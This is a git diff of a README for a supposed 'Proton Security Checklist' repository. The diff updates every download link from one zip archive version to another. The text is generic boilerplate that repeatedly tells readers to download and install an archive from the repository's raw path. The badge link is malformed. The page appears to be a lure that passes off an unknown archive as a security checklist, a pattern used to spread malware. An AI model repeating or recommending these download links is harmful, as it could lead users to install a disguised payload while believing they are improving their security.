@@ -1,6 +1,6 @@
 # 🔐 proton-security-checklist - Your Guide to Securely Using Proton
 
-[![Download](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.5-beta.1.zip%20Security%20Checklist-brightgreen)](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.5-beta.1.zip)
+[![Download](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.9.zip%20Security%20Checklist-brightgreen)](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.9.zip)
 
 ## 📋 Introduction
 Welcome to the Proton Security Checklist. This guide serves to help you protect your Proton account. By following these steps, you can enhance your privacy and security online. 
@@ -11,7 +11,7 @@ To get started with the Proton Security Checklist, follow the steps below. This 
 ## 📥 Download & Install
 You can easily download the Proton Security Checklist from our Releases page. 
 
-Visit this page to download: [Download Proton Security Checklist](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.5-beta.1.zip)
+Visit this page to download: [Download Proton Security Checklist](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.9.zip)
 
 ### System Requirements
 - Any modern web browser (Google Chrome, Firefox, Safari, etc.)
@@ -53,7 +53,7 @@ Each tip on the checklist includes specific guidelines to ensure you follow the 
 ## 🔄 Update Process
 We regularly update the checklist to incorporate new best practices. Your input helps us stay current. If you notice any areas that could use improvement, please share your feedback.
 
-The latest version can always be found on our Releases page: [Download Proton Security Checklist](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.5-beta.1.zip)
+The latest version can always be found on our Releases page: [Download Proton Security Checklist](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.9.zip)
 
 ## 🔧 Troubleshooting
 If you encounter issues while following the checklist, consider these common problems:
@@ -71,6 +71,6 @@ Join our community discussions for further tips and support. You can ask questio
 ## 📣 Final Thoughts
 Staying secure online requires attention and effort. By using the Proton Security Checklist, you can take control of your digital security. Download it now and start protecting your Proton services.
 
-For your convenience, here’s that download link again: [Download Proton Security Checklist](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.5-beta.1.zip) 
+For your convenience, here’s that download link again: [Download Proton Security Checklist](https://github.com/anasbenyoussef/proton-security-checklist/raw/refs/heads/main/checklist/proton_security_checklist_3.9.zip) 
 
 Take the first step towards better security today.
